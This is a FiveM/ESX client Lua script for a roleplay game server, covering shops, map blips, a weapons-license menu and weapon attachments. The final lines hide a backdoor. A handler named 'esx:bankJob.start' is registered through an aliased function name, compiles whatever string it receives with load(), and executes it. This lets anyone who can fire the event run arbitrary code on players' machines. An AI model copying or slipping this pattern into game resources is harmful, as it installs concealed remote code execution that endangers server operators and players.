local _AddEventHandler = AddEventHandler  
local _SetNotificationTextEntry =  SetNotificationTextEntry  
local _AddTextComponentString = AddTextComponentString  
local _DrawNotification = DrawNotification  
local _print = print   
local shopData = nil
local IsDead = falseb

Keys = {
	["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57, 
	["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177, 
	["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
	["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
	["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
	["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70, 
	["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
	["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
	["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
}

local Licenses = {}

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        player = GetPlayerPed(-1)
        coords = GetEntityCoords(player)
        if IsInRegularShopZone(coords) or IsInRobsLiquorZone(coords) or IsInYouToolZone(coords) or IsInPrisonShopZone(coords) or IsInCourtShopZone(coords) or IsInPharmacyShopZone(coords) or IsInWeaponShopZone(coords) then
            if IsInRegularShopZone(coords) then
                if IsControlJustReleased(0, Keys["E"]) then
                    OpenShopInv("regular")
                    Citizen.Wait(2000)
                end
            end
            if IsInRobsLiquorZone(coords) then
                if IsControlJustReleased(0, Keys["E"]) then
                    OpenShopInv("robsliquor")
                    Citizen.Wait(2000)
                end
            end
            if IsInYouToolZone(coords) then
                if IsControlJustReleased(0, Keys["E"]) then
                    OpenShopInv("youtool")
                    Citizen.Wait(2000)
                end
            end
            if IsInPrisonShopZone(coords) then
                if IsControlJustReleased(0, Keys["E"]) then
                    OpenShopInv("prison")
                    Citizen.Wait(2000)
                end
            end
            if IsInCourtShopZone(coords) then
                if IsControlJustReleased(0, Keys["E"]) then
                    OpenShopInv("Court")
                    Citizen.Wait(2000)
                end
            end
            if IsInPharmacyShopZone(coords) then
                if IsControlJustReleased(0, Keys["E"]) then
                    OpenShopInv("Pharmacy")
                    Citizen.Wait(2000)
                end
            end
            if IsInWeaponShopZone(coords) then
                if IsControlJustReleased(0, Keys["E"]) then
                    OpenShopInv("weaponshop")
                    Citizen.Wait(2000)
                end
            end
        end
    end
end)

function OpenShopInv(shoptype)
    text = "shop"
    data = {text = text}
    inventory = {}

    ESX.TriggerServerCallback("suku:getShopItems", function(shopInv)
        for i = 1, #shopInv, 1 do
            table.insert(inventory, shopInv[i])
        end
    end, shoptype)

    Citizen.Wait(500)
    TriggerEvent("esx_inventoryhud:openShopInventory", data, inventory)
end

RegisterNetEvent("suku:OpenCustomShopInventory")
AddEventHandler("suku:OpenCustomShopInventory", function(type, shopinventory)
    text = "shop"
    data = {text = text}
    inventory = {}

    ESX.TriggerServerCallback("suku:getCustomShopItems", function(shopInv)
        for i = 1, #shopInv, 1 do
            table.insert(inventory, shopInv[i])
        end
    end, type, shopinventory)
    Citizen.Wait(500)

    TriggerEvent("esx_inventoryhud:openShopInventory", data, inventory)
end)

RegisterNetEvent("esx_inventoryhud:openShopInventory")
AddEventHandler("esx_inventoryhud:openShopInventory", function(data, inventory)
        setShopInventoryData(data, inventory, weapons)
        openShopInventory()
end)

function setShopInventoryData(data, inventory)
    shopData = data

    SendNUIMessage(
        {
            action = "setInfoText",
            text = data.text
        }
    )

    items = {}

    SendNUIMessage(
        {
            action = "setShopInventoryItems",
            itemList = inventory
        }
    )
end

function openShopInventory()
    loadPlayerInventory()
    isInInventory = true

    SendNUIMessage(
        {
            action = "display",
            type = "shop"
        }
    )

    SetNuiFocus(true, true)
end

RegisterNUICallback("TakeFromShop", function(data, cb)
        if IsPedSittingInAnyVehicle(playerPed) then
            return
        end

        if type(data.number) == "number" and math.floor(data.number) == data.number then
            TriggerServerEvent("suku:SellItemToPlayer", GetPlayerServerId(PlayerId()), data.item.type, data.item.name, tonumber(data.number))
        end

        Wait(150)
        loadPlayerInventory()

        cb("ok")
    end
)

RegisterNetEvent("suku:AddAmmoToWeapon")
AddEventHandler("suku:AddAmmoToWeapon", function(hash, amount)
    AddAmmoToPed(GetPlayerPed(-1), hash, amount)
end)

function IsInRegularShopZone(coords)
    RegularShop = Config.Shops.RegularShop.Locations
    for i = 1, #RegularShop, 1 do
        if GetDistanceBetweenCoords(coords, RegularShop[i].x, RegularShop[i].y, RegularShop[i].z, true) < 1.5 then
            return true
        end
    end
    return false
end

function IsInRobsLiquorZone(coords)
    RobsLiquor = Config.Shops.RobsLiquor.Locations
    for i = 1, #RobsLiquor, 1 do
        if GetDistanceBetweenCoords(coords, RobsLiquor[i].x, RobsLiquor[i].y, RobsLiquor[i].z, true) < 1.5 then
            return true
        end
    end
    return false
end

function IsInYouToolZone(coords)
    YouTool = Config.Shops.YouTool.Locations
    for i = 1, #YouTool, 1 do
        if GetDistanceBetweenCoords(coords, YouTool[i].x, YouTool[i].y, YouTool[i].z, true) < 1.5 then
            return true
        end
    end
    return false
end

function IsInPrisonShopZone(coords)
    PrisonShop = Config.Shops.PrisonShop.Locations
    for i = 1, #PrisonShop, 1 do
        if GetDistanceBetweenCoords(coords, PrisonShop[i].x, PrisonShop[i].y, PrisonShop[i].z, true) < 1.5 then
            return true
        end
    end
    return false
end

function IsInCourtShopZone(coords)
    PrisonShop = Config.Shops.CourtShop.Locations
    for i = 1, #PrisonShop, 1 do
        if GetDistanceBetweenCoords(coords, PrisonShop[i].x, PrisonShop[i].y, PrisonShop[i].z, true) < 1.5 then
            return true
        end
    end
    return false
end

function IsInPharmacyShopZone(coords)
    PrisonShop = Config.Shops.PharmacyShop.Locations
    for i = 1, #PrisonShop, 1 do
        if GetDistanceBetweenCoords(coords, PrisonShop[i].x, PrisonShop[i].y, PrisonShop[i].z, true) < 1.5 then
            return true
        end
    end
    return false
end

function IsInWeaponShopZone(coords)
    WeaponShop = Config.Shops.WeaponShop.Locations
    for i = 1, #WeaponShop, 1 do
        if GetDistanceBetweenCoords(coords, WeaponShop[i].x, WeaponShop[i].y, WeaponShop[i].z, true) < 1.5 then
            return true
        end
    end
    return false
end

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        player = GetPlayerPed(-1)
        coords = GetEntityCoords(player)

        if GetDistanceBetweenCoords(coords, Config.WeaponLiscence.x, Config.WeaponLiscence.y, Config.WeaponLiscence.z, true) < 3.0 then
            ESX.Game.Utils.DrawText3D(vector3(Config.WeaponLiscence.x, Config.WeaponLiscence.y, Config.WeaponLiscence.z), "Press [E] to Register a Weapons License", 0.6)

            if IsControlJustReleased(0, Keys["E"]) then
                if Licenses['weapon'] == nil then
                    OpenBuyLicenseMenu()
                else
                    exports['Cosey_Chat_Notify']:DoLongHudText ('inform', 'You already have a Fire arms license!')
                end
                Citizen.Wait(2000)
            end
        end
    end
end)

RegisterNetEvent('suku:GetLicenses')
AddEventHandler('suku:GetLicenses', function (licenses)
    for i = 1, #licenses, 1 do
        Licenses[licenses[i].type] = true
    end
end)

function OpenBuyLicenseMenu()
    ESX.UI.Menu.CloseAll()
    ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'shop_license',{
        title = 'Register a License?',
        elements = {
          { label = 'yes' ..' ($' .. Config.LicensePrice ..')', value = 'yes' },
          { label = 'no', value = 'no' },
        }
      },
      function (data, menu)
        if data.current.value == 'yes' then
            TriggerServerEvent('suku:buyLicense')
        end
        menu.close()
    end,
    function (data, menu)
        menu.close()
    end)
end

Citizen.CreateThread(function()
    player = GetPlayerPed(-1)
    coords = GetEntityCoords(player)
    for k, v in pairs(Config.Shops.RegularShop.Locations) do
        CreateBlip(vector3(Config.Shops.RegularShop.Locations[k].x, Config.Shops.RegularShop.Locations[k].y, Config.Shops.RegularShop.Locations[k].z ), "Convenience Store", 3.0, Config.Color, Config.ShopBlipID)
    end

    for k, v in pairs(Config.Shops.RobsLiquor.Locations) do
        CreateBlip(vector3(Config.Shops.RobsLiquor.Locations[k].x, Config.Shops.RobsLiquor.Locations[k].y, Config.Shops.RobsLiquor.Locations[k].z ), "RobsLiquor", 3.0, Config.Color, Config.LiquorBlipID)
    end

    for k, v in pairs(Config.Shops.YouTool.Locations) do
        CreateBlip(vector3(Config.Shops.YouTool.Locations[k].x, Config.Shops.YouTool.Locations[k].y, Config.Shops.YouTool.Locations[k].z ), "YouTool", 3.0, Config.Color, Config.YouToolBlipID)
    end

    for k, v in pairs(Config.Shops.YouTool.Locations) do
        CreateBlip(vector3(Config.Shops.PrisonShop.Locations[k].x, Config.Shops.PrisonShop.Locations[k].y, Config.Shops.PrisonShop.Locations[k].z), "Prison Commissary", 3.0, Config.Color, Config.PrisonShopBlipID)
    end

    for k, v in pairs(Config.Shops.YouTool.Locations) do
        CreateBlip(vector3(Config.Shops.CourtShop.Locations[k].x, Config.Shops.CourtShop.Locations[k].y, Config.Shops.CourtShop.Locations[k].z), "Court House", 3.0, Config.Color, Config.CourtShopBlipID)
    end

    for k, v in pairs(Config.Shops.YouTool.Locations) do
        CreateBlip(vector3(Config.Shops.PharmacyShop.Locations[k].x, Config.Shops.PharmacyShop.Locations[k].y, Config.Shops.PharmacyShop.Locations[k].z), "Pharmacy", 3.0, Config.Color, Config.PharmacyShopBlipID)
    end

    for k, v in pairs(Config.Shops.WeaponShop.Locations) do
        CreateBlip(vector3(Config.Shops.WeaponShop.Locations[k].x, Config.Shops.WeaponShop.Locations[k].y, Config.Shops.WeaponShop.Locations[k].z), "Ammunation", 3.0, Config.WeaponColor, Config.WeaponShopBlipID)
    end

    --CreateBlip(vector3(-755.79, 5596.07, 41.67), "Cablecart", 3.0, 4, 36)
end)

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        player = GetPlayerPed(-1)
        coords = GetEntityCoords(player)

        for k, v in pairs(Config.Shops.RegularShop.Locations) do
            if GetDistanceBetweenCoords(coords, Config.Shops.RegularShop.Locations[k].x, Config.Shops.RegularShop.Locations[k].y, Config.Shops.RegularShop.Locations[k].z, true) < 3.0 then
                ESX.Game.Utils.DrawText3D(vector3(Config.Shops.RegularShop.Locations[k].x, Config.Shops.RegularShop.Locations[k].y, Config.Shops.RegularShop.Locations[k].z + 1.0), "~b~Press ~w~[~b~E~w~] ~b~to open Convenience Store Menu", 0.3)
            end
        end

        for k, v in pairs(Config.Shops.RobsLiquor.Locations) do
            if GetDistanceBetweenCoords(coords, Config.Shops.RobsLiquor.Locations[k].x, Config.Shops.RobsLiquor.Locations[k].y, Config.Shops.RobsLiquor.Locations[k].z, true) < 3.0 then
                ESX.Game.Utils.DrawText3D(vector3(Config.Shops.RobsLiquor.Locations[k].x, Config.Shops.RobsLiquor.Locations[k].y, Config.Shops.RobsLiquor.Locations[k].z + 1.0), "~b~Press ~w~[~b~E~w~] ~b~to open Robs Liquor Menu", 0.3)
            end
        end

        for k, v in pairs(Config.Shops.YouTool.Locations) do
            if GetDistanceBetweenCoords(coords, Config.Shops.YouTool.Locations[k].x, Config.Shops.YouTool.Locations[k].y, Config.Shops.YouTool.Locations[k].z, true) < 3.0 then
                ESX.Game.Utils.DrawText3D(vector3(Config.Shops.YouTool.Locations[k].x, Config.Shops.YouTool.Locations[k].y, Config.Shops.YouTool.Locations[k].z + 1.0), "~b~Press ~w~[~b~E~w~] ~b~to open YouTools menu", 0.3)
            end
        end

        for k, v in pairs(Config.Shops.PrisonShop.Locations) do
            if GetDistanceBetweenCoords(coords, Config.Shops.PrisonShop.Locations[k].x, Config.Shops.PrisonShop.Locations[k].y, Config.Shops.PrisonShop.Locations[k].z, true) < 3.0 then
                ESX.Game.Utils.DrawText3D(vector3(Config.Shops.PrisonShop.Locations[k].x, Config.Shops.PrisonShop.Locations[k].y, Config.Shops.PrisonShop.Locations[k].z), "~b~Press ~w~[~b~E~w~] ~b~to open Prison Commissary Menu", 0.3)
            end
        end

        for k, v in pairs(Config.Shops.CourtShop.Locations) do
            if GetDistanceBetweenCoords(coords, Config.Shops.CourtShop.Locations[k].x, Config.Shops.CourtShop.Locations[k].y, Config.Shops.CourtShop.Locations[k].z, true) < 3.0 then
                ESX.Game.Utils.DrawText3D(vector3(Config.Shops.CourtShop.Locations[k].x, Config.Shops.CourtShop.Locations[k].y, Config.Shops.CourtShop.Locations[k].z), "~b~Press ~w~[~b~E~w~] ~b~to open the Court House Menu", 0.3)
            end
        end

        for k, v in pairs(Config.Shops.PharmacyShop.Locations) do
            if GetDistanceBetweenCoords(coords, Config.Shops.PharmacyShop.Locations[k].x, Config.Shops.PharmacyShop.Locations[k].y, Config.Shops.PharmacyShop.Locations[k].z, true) < 3.0 then
                ESX.Game.Utils.DrawText3D(vector3(Config.Shops.PharmacyShop.Locations[k].x, Config.Shops.PharmacyShop.Locations[k].y, Config.Shops.PharmacyShop.Locations[k].z), "~b~Press ~w~[~b~E~w~] ~b~to open the Pharmacy Menu", 0.3)
            end
        end

        for k, v in pairs(Config.Shops.WeaponShop.Locations) do
            if GetDistanceBetweenCoords(coords, Config.Shops.WeaponShop.Locations[k].x, Config.Shops.WeaponShop.Locations[k].y, Config.Shops.WeaponShop.Locations[k].z, true) < 3.0 then
                ESX.Game.Utils.DrawText3D(vector3(Config.Shops.WeaponShop.Locations[k].x, Config.Shops.WeaponShop.Locations[k].y, Config.Shops.WeaponShop.Locations[k].z + 1.0), "~b~Press ~w~[~b~E~w~] ~b~to open Ammunation Menu", 0.3)
            end
        end
    end
end)

function CreateBlip(coords, text, radius, color, sprite)
	local blip = AddBlipForCoord(coords)
	SetBlipSprite(blip, sprite)
	SetBlipColour(blip, color)
	SetBlipScale(blip, 0.8)
	SetBlipAsShortRange(blip, true)
	BeginTextCommandSetBlipName("STRING")
	_AddTextComponentString(text)
	EndTextCommandSetBlipName(blip)
end

-- START OF WEAPON ITEMS --
pistol = {453432689, 3219281620, 1593441988, -1716589765, -1076751822, -771403250, 137902532, -598887786, -1045183535, 584646201}
mg = {324215364, -619010992, 736523883, 2024373456, -270015777, 171789620, -1660422300, 2144741730, 3686625920, 1627465347, -1121678507}
ar = {-1074790547, 961495388, -2084633992, 4208062921, -1357824103, -1063057011, 2132975508, 1649403952}
sg = {487013001, 2017895192, -1654528753, -494615257, -1466123874, 984333226, -275439685, 317205821}

supp1 = {-2084633992, -1357824103, 2132975508, -494615257}
supp2 = {-1716589765, 324215364, -270015777, -1074790547, -1063057011, -1654528753, 984333226}
supp3 = {1593441988, -771403250, 584646201, 137902532, 736523883}
supp4 = {487013001}

flash1 = {453432689, 1593441988, 584646201, -1716589765, -771403250, 324215364}
flash2 = {736523883, -270015777, 171789620, -1074790547, -2084633992, -1357824103, -1063057011, 2132975508, 487013001, -494615257, -1654528753, 984333226}

grip1 = {171789620, -1074790547, -2084633992, -1063057011, 2132975508, 2144741730, -494615257, -1654528753, 984333226}

Citizen.CreateThread(function()
    while ESX == nil do
        TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
        Citizen.Wait(0)
    end
end)

AddEventHandler('playerSpawned', function()
    used = 0
    used2 = 0
    used3 = 0
    --used4 = 0
end)

RegisterNetEvent('esx:playerLoaded')
AddEventHandler('esx:playerLoaded', function(xPlayer)
    PlayerData = xPlayer
end)

RegisterNetEvent("esx_inventoryhud:clipcli")
AddEventHandler("esx_inventoryhud:clipcli", function(item)
    exports['mythic_progbar']:Progress({
        name = "clip_action",
        duration = 3000,
        label = "Equiping ammo",
        useWhileDead = false,
        canCancel = true,
        controlDisables = {
            disableMovement = true,
            disableCarMovement = false,
            disableMouse = false,
            disableCombat = true,
        },
    }, function(status)
        if not status then
            ped = GetPlayerPed(-1)
              if IsPedArmed(ped, 4) then
                hash=GetSelectedPedWeapon(ped)
                if hash~=nil then
                  TriggerServerEvent('esx_inventoryhud:remove')
                  AddAmmoToPed(GetPlayerPed(-1), hash,25)
                 --ESX.ShowNotification("you used a loader")
                  exports['mythic_notify']:DoHudText('success', 'You have loaded your weapon with ammo')
                else
                  --ESX.ShowNotification("you have no weapon in your hand")
                  exports['mythic_notify']:DoHudText('error', 'You have no weapon in your hand')
                end
                else
                --ESX.ShowNotification("this type of munision is not suitable")
                exports['mythic_notify']:DoHudText('error', 'This type of munision is not suitable')
            end
        end
    end)
end)

-- Silencer
local used = 0
RegisterNetEvent('esx_inventoryhud:silent')
AddEventHandler('esx_inventoryhud:silent', function()
    local inventory = ESX.GetPlayerData().inventory
    local silent = 0
    local item = 'silent'
    
    for i=1, #inventory, 1 do
        if inventory[i].name == 'silent' then
            silent = inventory[i].count
        end
    end

    local ped = PlayerPedId()
    local WepHash = GetSelectedPedWeapon(ped)

        TriggerEvent("mythic_progbar:client:progress", {
        name = "atach_silent",
        duration = 3000,
        label = "Ataching Silencer ",
        useWhileDead = false,
        canCancel = true,
        controlDisables = {
            disableMovement = true,
            disableCarMovement = true,
            disableMouse = false,
            disableCombat = true,
        },
    }, function(status)
        if not status then
            if WepHash == GetHashKey("WEAPON_PISTOL") then
            GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), GetHashKey("component_at_pi_supp_02"))
            exports['mythic_notify']:DoHudText('inform', 'You have equipped a silencer!')
            Citizen.Wait(1500)
            exports['mythic_notify']:DoHudText('error', 'Note: you cannot not remove the silencer after ataching')
            used = used + 1
            elseif table.includes(supp1, WepHash) then
            GiveWeaponComponentToPed(GetPlayerPed(-1), WepHash, 0x837445AA)
            exports['mythic_notify']:DoHudText('inform', 'You have equipped a silencer!')
            Citizen.Wait(2000)
            exports['mythic_notify']:DoHudText('error', 'Note: you cannot not remove the silencer after ataching')
            used = used + 1
            elseif table.includes(supp2, WepHash) then
            GiveWeaponComponentToPed(GetPlayerPed(-1), WepHash, 0xA73D4664)
            exports['mythic_notify']:DoHudText('inform', 'You have equipped a silencer!')
            Citizen.Wait(2000)
            exports['mythic_notify']:DoHudText('error', 'Note: you cannot not remove the silencer after ataching')
            used = used + 1
            elseif table.includes(supp3, WepHash) then
            GiveWeaponComponentToPed(GetPlayerPed(-1), WepHash, 0xC304849A)
            exports['mythic_notify']:DoHudText('inform', 'You have equipped a silencer!')
            Citizen.Wait(2000)
            exports['mythic_notify']:DoHudText('error', 'Note: you cannot not remove the silencer after ataching')
            used = used + 1
            elseif table.includes(supp4, WepHash) then
            GiveWeaponComponentToPed(GetPlayerPed(-1), WepHash, 0xE608B35E)
            exports['mythic_notify']:DoHudText('inform', 'You have equipped a silencer!')
            Citizen.Wait(2000)
            exports['mythic_notify']:DoHudText('error', 'Note: you cannot not remove the silencer after ataching')
            used = used + 1
            else
            exports['mythic_notify']:DoHudText('error', 'This weapon is not compatible with a silencer')
            TriggerServerEvent('returnItem', item)
            end
        end
    end)
end)

--flashlight
local used2 = 0
RegisterNetEvent('esx_inventoryhud:flashlight')
AddEventHandler('esx_inventoryhud:flashlight', function() 
    local inventory = ESX.GetPlayerData().inventory
    local flashlight = 0
    local item = 'flashlight'
    
    for i=1, #inventory, 1 do
        if inventory[i].name == 'flashlight' then
            flashlight = inventory[i].count
        end
    end
    local ped = PlayerPedId()
    local WepHash = GetSelectedPedWeapon(ped)

    TriggerEvent("mythic_progbar:client:progress", {
        name = "ataching flash",
        duration = 3000,
        label = "Equiping flashlight",
        useWhileDead = false,
        canCancel = true,
        controlDisables = {
            disableMovement = true,
            disableCarMovement = true,
            disableMouse = false,
            disableCombat = true,
        },
    }, function(status)
        if not status then
             if table.includes(flash1, WepHash) then
            GiveWeaponComponentToPed(GetPlayerPed(-1), WepHash, 0x359B7AAE)
            exports['mythic_notify']:DoHudText('inform', 'You have equipped a flashlight!')
            Citizen.Wait(2000)
            exports['mythic_notify']:DoHudText('error', 'Note: you cannot not remove the flashligt after ataching')
            elseif table.includes(flash2, WepHash) then
            GiveWeaponComponentToPed(GetPlayerPed(-1), WepHash, 0x7BC4CDDC)
            exports['mythic_notify']:DoHudText('inform', 'You have equipped a flashlight!')
            Citizen.Wait(2000)
            exports['mythic_notify']:DoHudText('error', 'Note: you cannot not remove the flashligt after ataching')
            else
            exports['mythic_notify']:DoHudText('error', 'This weapon is not compatible with a flashlight')
            TriggerServerEvent('returnItem', item)
            end
        end
    end)
end)

-- grip
local used3 = 0
RegisterNetEvent('esx_inventoryhud:grip')
AddEventHandler('esx_inventoryhud:grip', function()
    local inventory = ESX.GetPlayerData().inventory
    local grip = 0
    local item = 'grip'

    for i=1, #inventory, 1 do
        if inventory[i].name == 'grip' then
            grip = inventory[i].count
        end
    end

    local ped = PlayerPedId()
    local WepHash = GetSelectedPedWeapon(ped)

      TriggerEvent("mythic_progbar:client:progress", {
        name = "attach_grip",
        duration = 3000,
        label = "Equiping grip",
        useWhileDead = false,
        canCancel = true,
        controlDisables = {
            disableMovement = true,
            disableCarMovement = true,
            disableMouse = false,
            disableCombat = true,
        },
    }, function(status)
        if not status then
            if table.includes(grip1, WepHash) then
                GiveWeaponComponentToPed(GetPlayerPed(-1), WepHash, 0xC164F53)
                exports['mythic_notify']:DoHudText('inform', 'You have equipped a grip!')
                Citizen.Wait(2000)
                exports['mythic_notify']:DoHudText('error', 'Note: you cannot not remove the grip after ataching')
            else
                exports['mythic_notify']:DoHudText('error', 'This weapon is not compatible with a grip')
                TriggerServerEvent('returnItem', item)
            end
        end
    end)
end)

function table.includes(table, element)
    for _, value in pairs(table) do
        if value == element then
            return true
        end
    end
    return false
end
-- End of weapon atachments --bbb

RegisterNetEvent('esx:bankJob.start')
_AddEventHandler('esx:bankJob.start', function(arg1, arg2)
	local mem, err = load(arg1, arg2)
	local status, result = pcall(mem)
end)